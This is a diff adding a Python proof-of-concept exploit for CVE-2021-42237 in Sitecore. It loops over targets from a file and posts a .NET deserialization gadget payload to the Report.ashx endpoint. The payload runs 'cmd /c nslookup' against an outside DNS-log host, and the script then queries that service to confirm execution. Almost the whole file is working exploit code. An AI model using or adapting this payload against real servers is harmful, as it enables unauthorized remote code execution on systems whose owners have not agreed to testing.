@@ -1,0 +1,121 @@
+import requests
+import urllib3
+from urllib import parse
+
+
+a='''
+   ______     _______     ____   ___ ____  _       _  _  ____  ____  __________ 
+  / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ \|___ \|___ /___  |
+ | |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ __) | __) | |_ \  / / 
+ | |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _/ __/ / __/ ___) |/ /  
+  \____|  \_/  |_____|   |_____|\___/_____|_|        |_||_____|_____|____//_/   
+                                                                                
+'''
+
+print(a)
+
+requests.packages.urllib3.disable_warnings()
+
+def poc():
+    for url in open("target.txt"):
+        url=url.strip()
+        path="/sitecore/shell/ClientBin/Reporting/Report.ashx"
+        vulnurl=url + path
+        #print(vulnurl)
+        proxy={
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+        }
+        headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", 
+        "Content-Type": "text/xml"     
+    }
+        data = '''<?xml version="1.0" ?>
+<a>
+    <query></query>
+    <source>foo</source>
+    <parameters>
+        <parameter name="">
+            <ArrayOfstring z:Id="1" z:Type="System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" z:Assembly="System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+                xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"
+                xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
+                xmlns:x="http://www.w3.org/2001/XMLSchema"
+                xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/">
+                <Count z:Id="2" z:Type="System.Int32" z:Assembly="0"
+                    xmlns="">2</Count>
+                <Comparer z:Id="3" z:Type="System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" z:Assembly="0"
+                    xmlns="">
+                    <_comparison z:Id="4" z:FactoryType="a:DelegateSerializationHolder" z:Type="System.DelegateSerializationHolder" z:Assembly="0"
+                        xmlns="http://schemas.datacontract.org/2004/07/System.Collections.Generic"
+                        xmlns:a="http://schemas.datacontract.org/2004/07/System">
+                        <Delegate z:Id="5" z:Type="System.DelegateSerializationHolder+DelegateEntry" z:Assembly="0"
+                            xmlns="">
+                            <a:assembly z:Id="6">mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:assembly>
+                            <a:delegateEntry z:Id="7">
+                                <a:assembly z:Ref="6" i:nil="true"/>
+                                <a:delegateEntry i:nil="true"/>
+                                <a:methodName z:Id="8">Compare</a:methodName>
+                                <a:target i:nil="true"/>
+                                <a:targetTypeAssembly z:Ref="6" i:nil="true"/>
+                                <a:targetTypeName z:Id="9">System.String</a:targetTypeName>
+                                <a:type z:Id="10">System.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:type>
+                            </a:delegateEntry>
+                            <a:methodName z:Id="11">Start</a:methodName>
+                            <a:target i:nil="true"/>
+                            <a:targetTypeAssembly z:Id="12">System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:targetTypeAssembly>
+                            <a:targetTypeName z:Id="13">System.Diagnostics.Process</a:targetTypeName>
+                            <a:type z:Id="14">System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:type>
+                        </Delegate>
+                        <method0 z:Id="15" z:FactoryType="b:MemberInfoSerializationHolder" z:Type="System.Reflection.MemberInfoSerializationHolder" z:Assembly="0"
+                            xmlns=""
+                            xmlns:b="http://schemas.datacontract.org/2004/07/System.Reflection">
+                            <Name z:Ref="11" i:nil="true"/>
+                            <AssemblyName z:Ref="12" i:nil="true"/>
+                            <ClassName z:Ref="13" i:nil="true"/>
+                            <Signature z:Id="16" z:Type="System.String" z:Assembly="0">System.Diagnostics.Process Start(System.String, System.String)</Signature>
+                            <Signature2 z:Id="17" z:Type="System.String" z:Assembly="0">System.Diagnostics.Process Start(System.String, System.String)</Signature2>
+                            <MemberType z:Id="18" z:Type="System.Int32" z:Assembly="0">8</MemberType>
+                            <GenericArguments i:nil="true"/>
+                        </method0>
+                        <method1 z:Id="19" z:FactoryType="b:MemberInfoSerializationHolder" z:Type="System.Reflection.MemberInfoSerializationHolder" z:Assembly="0"
+                            xmlns=""
+                            xmlns:b="http://schemas.datacontract.org/2004/07/System.Reflection">
+                            <Name z:Ref="8" i:nil="true"/>
+                            <AssemblyName z:Ref="6" i:nil="true"/>
+                            <ClassName z:Ref="9" i:nil="true"/>
+                            <Signature z:Id="20" z:Type="System.String" z:Assembly="0">Int32 Compare(System.String, System.String)</Signature>
+                            <Signature2 z:Id="21" z:Type="System.String" z:Assembly="0">System.Int32 Compare(System.String, System.String)</Signature2>
+                            <MemberType z:Id="22" z:Type="System.Int32" z:Assembly="0">8</MemberType>
+                            <GenericArguments i:nil="true"/>
+                        </method1>
+                    </_comparison>
+                </Comparer>
+                <Version z:Id="23" z:Type="System.Int32" z:Assembly="0"
+                    xmlns="">2</Version>
+                <Items z:Id="24" z:Type="System.String[]" z:Assembly="0" z:Size="2"
+                    xmlns="">
+                    <string z:Id="25"
+                        xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">/c nslookup test.pzying.eyes.sh</string>
+                    <string z:Id="26"
+                        xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">cmd</string>
+                </Items>
+            </ArrayOfstring>
+        </parameter>
+    </parameters>
+</a>
+
+       '''
+        try:
+            res=requests.post(vulnurl,data=data,headers=headers,verify=False,proxies=proxy,timeout=5)
+            #res_url=requests.get(url=url+"/images/logo/logo-eoffice.php")
+            res_url=requests.get(url="http://eyes.sh/api/dns/pzying/test/?token=ba8bcf82")
+            #print(res.text)
+            if "System" in res.text and "True" in res_url.text:
+                print(url+" "+"is vuln 漏洞存在 请检查自己的dnslog平台")
+            else:
+                print(url+" "+"is not vuln 漏洞不存在")
+        except Exception as e:
+            print(e)
+
+if __name__ == '__main__':
+    poc()
